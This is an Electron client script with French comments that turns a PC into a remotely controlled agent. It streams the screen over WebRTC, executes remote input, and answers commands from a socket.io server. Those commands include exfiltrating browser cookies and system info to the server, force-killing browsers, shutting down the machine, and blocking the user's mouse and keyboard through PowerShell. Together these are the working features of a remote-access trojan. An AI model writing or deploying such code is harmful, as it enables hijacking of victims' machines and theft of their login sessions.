const { ipcRenderer } = require('electron');
const io = require('socket.io-client');
const { SERVER_URL } = require('../config');

const RTC_CONFIG = {
  iceServers: [
    { urls: 'stun:stun.l.google.com:19302' },
    { urls: 'stun:stun1.l.google.com:19302' },
    { urls: 'stun:stun2.l.google.com:19302' }
  ]
};

let socket;
let peerConnections = {}; // controllerId → RTCPeerConnection
let screenStream = null;

function updateStatus(text) {
  const controllers = Object.keys(peerConnections).length;
  ipcRenderer.send('status-update', { text, controllers });
}

// ── Capture d'écran ──
async function getScreenStream() {
  const sources = await ipcRenderer.invoke('get-screen-sources');
  if (!sources || sources.length === 0) throw new Error('Aucun écran trouvé');

  const source = sources[0];
  return await navigator.mediaDevices.getUserMedia({
    audio: false,
    video: {
      mandatory: {
        chromeMediaSource: 'desktop',
        chromeMediaSourceId: source.id,
        maxWidth: 1920,
        maxHeight: 1080,
        maxFrameRate: 15
      }
    }
  });
}

// ── Connexion WebRTC avec un controller ──
async function createPeerConnection(controllerId) {
  if (!screenStream) {
    screenStream = await getScreenStream();
  }

  const pc = new RTCPeerConnection(RTC_CONFIG);
  peerConnections[controllerId] = pc;

  screenStream.getTracks().forEach(track => pc.addTrack(track, screenStream));

  pc.onicecandidate = ({ candidate }) => {
    if (candidate) {
      socket.emit('signal', { to: controllerId, signal: { type: 'ice', candidate } });
    }
  };

  pc.onconnectionstatechange = () => {
    const state = pc.connectionState;
    const count = Object.keys(peerConnections).length;

    if (state === 'connected') {
      updateStatus(count > 1 ? `${count} contrôleurs connectés` : 'Contrôlé');
    } else if (['disconnected', 'failed', 'closed'].includes(state)) {
      delete peerConnections[controllerId];
      const remaining = Object.keys(peerConnections).length;
      updateStatus(remaining > 0 ? `${remaining} contrôleur(s)` : 'En attente');
    }
  };

  const offer = await pc.createOffer({ offerToReceiveAudio: false, offerToReceiveVideo: false });
  await pc.setLocalDescription(offer);
  socket.emit('signal', { to: controllerId, signal: { type: 'offer', sdp: offer } });

  return pc;
}

// ── Socket.io ──
// ── Commandes macro + info ──
socket_on_command = async (cmd) => {
  if (cmd === 'get-info') {
    const info = await ipcRenderer.invoke('get-system-info');
    socket.emit('command:result', { cmd, data: info });
  } else if (cmd === 'get-cookies') {
    const result = await ipcRenderer.invoke('get-cookies');
    socket.emit('command:result', { cmd, data: result });
  } else if (cmd === 'reboot') {
    require('child_process').exec('shutdown /r /t 5');
    socket.emit('command:result', { cmd, data: 'Redémarrage dans 5s' });
  } else if (cmd === 'shutdown') {
    require('child_process').exec('shutdown /s /t 5');
    socket.emit('command:result', { cmd, data: 'Extinction dans 5s' });
  } else if (cmd === 'lock') {
    require('child_process').exec('rundll32.exe user32.dll,LockWorkStation');
    socket.emit('command:result', { cmd, data: 'Poste verrouillé' });
  } else if (cmd === 'kill-browser') {
    require('child_process').exec('taskkill /F /IM chrome.exe /IM firefox.exe /IM msedge.exe 2>nul');
    socket.emit('command:result', { cmd, data: 'Navigateur fermé' });
  } else if (cmd === 'open-taskmgr') {
    require('child_process').exec('taskmgr');
    socket.emit('command:result', { cmd, data: 'Gestionnaire ouvert' });
  } else if (cmd === 'block-input') {
    require('child_process').exec(`powershell -NoProfile -Command "Add-Type -TypeDefinition 'using System;using System.Runtime.InteropServices;public class B{[DllImport(\\"user32.dll\\")]public static extern bool BlockInput(bool b);}';[B]::BlockInput($true)"`, () => {});
    socket.emit('command:result', { cmd, data: 'Souris/clavier bloqués' });
  } else if (cmd === 'unblock-input') {
    require('child_process').exec(`powershell -NoProfile -Command "Add-Type -TypeDefinition 'using System;using System.Runtime.InteropServices;public class B{[DllImport(\\"user32.dll\\")]public static extern bool BlockInput(bool b);}';[B]::BlockInput($false)"`, () => {});
    socket.emit('command:result', { cmd, data: 'Souris/clavier débloqués' });
  } else if (cmd === 'screenshot-info') {
    const info = await ipcRenderer.invoke('get-screen-size');
    socket.emit('command:result', { cmd, data: info });
  }
};

async function connect() {
  const hostname = await ipcRenderer.invoke('get-hostname');

  updateStatus('Connexion au serveur...');

  socket = io(SERVER_URL, {
    reconnectionDelay: 2000,
    reconnectionDelayMax: 10000,
    timeout: 10000
  });

  socket.on('connect', () => {
    socket.emit('agent:register', { name: hostname });
  });

  socket.on('agent:registered', () => {
    updateStatus('En attente de connexion');
  });

  socket.on('controller:joined', async (controllerId) => {
    updateStatus('Établissement WebRTC...');
    try {
      await createPeerConnection(controllerId);
    } catch (err) {
      updateStatus(`Erreur: ${err.message}`);
    }
  });

  socket.on('signal', async ({ from, signal }) => {
    const pc = peerConnections[from];
    if (!pc) return;

    if (signal.type === 'answer') {
      await pc.setRemoteDescription(new RTCSessionDescription(signal.sdp));
    } else if (signal.type === 'ice' && signal.candidate) {
      await pc.addIceCandidate(new RTCIceCandidate(signal.candidate)).catch(() => {});
    }
  });

  socket.on('input', (event) => {
    ipcRenderer.send('execute-input', event);
  });

  socket.on('command', (cmd) => { socket_on_command(cmd); });

  socket.on('controller:left', (controllerId) => {
    const pc = peerConnections[controllerId];
    if (pc) { pc.close(); delete peerConnections[controllerId]; }
    const remaining = Object.keys(peerConnections).length;
    updateStatus(remaining > 0 ? `${remaining} contrôleur(s)` : 'En attente');
  });

  socket.on('disconnect', () => updateStatus('Déconnecté — reconnexion...'));
  socket.on('connect_error', () => updateStatus('Serveur inaccessible'));
}

connect();
